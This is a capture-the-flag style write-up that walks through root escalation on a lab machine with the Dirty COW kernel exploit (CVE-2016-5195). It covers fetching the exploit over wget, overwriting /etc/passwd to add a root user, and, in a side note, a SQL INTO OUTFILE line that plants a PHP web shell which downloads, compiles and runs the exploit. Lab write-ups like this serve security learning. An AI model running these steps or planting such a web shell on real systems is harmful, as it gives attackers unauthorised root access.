# Wrightup 2:

## First steps:

First of all we need to check the version of the Kernel that we are running, some Linux kernel version have vulnerabilities that we can exploit to get unauthorised privileges for example.
```
laurie@BornToSecHackMe:~$ uname -r
3.2.0-91-generic-pae
```
Now that we got the kernel version let’s check the architecture this machine is running on :

```
laurie@BornToSecHackMe:~$ lscpu
Architecture:          i686
CPU op-mode(s):        32-bit, 64-bit
Byte Order:            Little Endian
CPU(s):                1
On-line CPU(s) list:   0
Thread(s) per core:    1
Core(s) per socket:    1
Socket(s):             1
Vendor ID:             GenuineIntel
CPU family:            6
Model:                 126
Stepping:              5
CPU MHz:               1996.800
BogoMIPS:              3993.60
Hypervisor vendor:     KVM
Virtualization type:   full
L1d cache:             48K
L1i cache:             32K
L2 cache:              512K
L3 cache:              6144K
```
We can see that this machine is running on `i686` which mean that we got a `32-bit` architecture.

So now with those infos in mind we can search for the right exploit that could work in this configuration, and luckily there’s a well knows `CVE` for this kernel version and that work with `32-bit` architecture.

`CVE-2016-5195` or commonly known as `Dirty COW` (for copy on write) is a known bug based on a race condition that can enable us to modify files we can normally read from but not write into for exemple `/etc/passwd` or any Set-UID program like `/usr/bin/passwd`.
> NB : we can only overwrite already existing bytes in the files not add new ones.

There’s many exploits for this vulnerability, we will stick to one that is simple and quite easy to understand. This version of the exploit will replace root in `/etc/passwd` by a user named `firefart` with a new hashed password that we can specify.

## Exploit execution:
Firstly we will start by downloading the exploit, then we create a simple http server using python so we can transfer the file to the machine.

```
➜  ~ gcl https://github.com/firefart/dirtycow.git
Cloning into 'dirtycow'...
remote: Enumerating objects: 26, done.
remote: Counting objects: 100% (3/3), done.
remote: Compressing objects: 100% (3/3), done.
remote: Total 26 (delta 0), reused 0 (delta 0), pack-reused 23
Receiving objects: 100% (26/26), 8.23 KiB | 2.74 MiB/s, done.
Resolving deltas: 100% (6/6), done.
➜  ~ cd dirtycow
➜  dirtycow git:(master) python3 -m http.server
Serving HTTP on :: port 8000 (http://[::]:8000/) ...
```
Then from the machine we will use `wget` to get our file from the http sever:

```
laurie@BornToSecHackMe:~$ wget http://192.168.56.1:8000/dirty.c
--2022-10-01 05:56:14--  http://192.168.56.1:8000/dirty.c
Connecting to 192.168.56.1:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4815 (4.7K) [text/x-c]
Saving to: `dirty.c.1'

100%[================================>] 4,815       --.-K/s   in 0s

2022-10-01 05:56:14 (12.6 MB/s) - `dirty.c.1' saved [4815/4815]

laurie@BornToSecHackMe:~$
```

Then we compile the c file and run it with our new user’s password as an argument, since this exploit is based on a rase condition it may take some time for it to finish.

```
laurie@BornToSecHackMe:~$ ./dirty fire
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: fire
Complete line:
firefart:fi0oPvJ9W1EEU:0:0:pwned:/root:/bin/bash

mmap: b7fda000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'fire'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'fire'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
laurie@BornToSecHackMe:~$
```
Let’s check `/etc/passwd` now to see if it worked:

```
laurie@BornToSecHackMe:~$ cat /etc/passwd
firefart:fi0oPvJ9W1EEU:0:0:pwned:/root:/bin/bash
/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
…
```
**TADAM** ! Job done we can see that our newly created user is there and he is root !
(The catch is that there’s no user called root anymore).

Let’s access to firefart and see for ourselves :
```
laurie@BornToSecHackMe:~$ su firefart
Password:
firefart@BornToSecHackMe:/home/laurie# id
uid=0(firefart) gid=0(root) groups=0(root)
firefart@BornToSecHackMe:/home/laurie#
```

## Side note:
I choose to start this exploit  after getting connected to Laurie but with enough patience this methodology could work from a php backdoor too using something like:
```php
SELECT “<?php system('wget http://192.168.56.1:8000/dirty.c && gcc -pthread dirty.c -o dirty -lcrypt && ./dirty fire'); ?>” INTO OUTFILE '/var/www/forum/templates_c/backfart.php'
```
Then we can just go to our virtualisation software and log in using the new user we created and password to access root.

## Useful links :
* The source code for this exploit can be found [here](https://github.com/firefart/dirtycow).

* Other exploits related to this `CVE` can be found [here](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)

* More explanations on how the exploit works can be found here [here](https://www.cs.toronto.edu/~arnold/427/18s/427_18S/indepth/dirty-cow/demo.html)
